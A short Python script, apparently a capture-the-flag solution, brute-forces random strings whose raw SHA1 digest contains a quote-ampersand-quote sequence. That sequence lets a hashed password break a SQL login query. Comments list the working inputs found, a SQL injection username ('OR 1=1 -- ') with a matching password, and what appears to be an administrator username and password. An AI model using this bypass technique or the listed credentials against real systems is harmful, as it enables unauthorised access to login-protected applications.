import hashlib
import random
import string
import time


def random_string(size=40, chars=string.ascii_uppercase+string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

start = time.time()
found = False
while not found:
    s = random_string(40)
    m = hashlib.sha1()
    m.update(s)

    if "'&'" in m.digest():
        print("FOUND !!!")
        print(m.hexdigest())
        print(s)
        found = True

print("Made in "+str(time.time()-start)+" seconds")

# e10ebcb901e4e1274f525d2565e49c2f11ea5115
# EHIS2ZJBF4JEIJEFC3IVN1T0H8T0EK7ICD77GPBX
#
# bd0ca4007ba300dc8a274f5227ee2522f165c8f0
# EOLKKN85E1JG1W53YDZKQIP787TOM5NF32JQELM8
#
# abeda21a3948ed274f27bdf9c275c09504a3950e
# PH1302JDGYVEYAQ78RFZVP9GI32YBI1G155RISJ7
#
# e2a3be21274f52273fb862c2849f8db5265c4539
# YHJ29T1C7KPLQQIH4IZFZGZNJOLULUCP8E9G73U4
#
#username : OR 1=1 -- '
#pass : 3AD16ZB32E4PIVVFZF2J1RCRUZKKB1RTSHSLZ5EX

#administrateur
#mxYXd4hz5WAjTe1
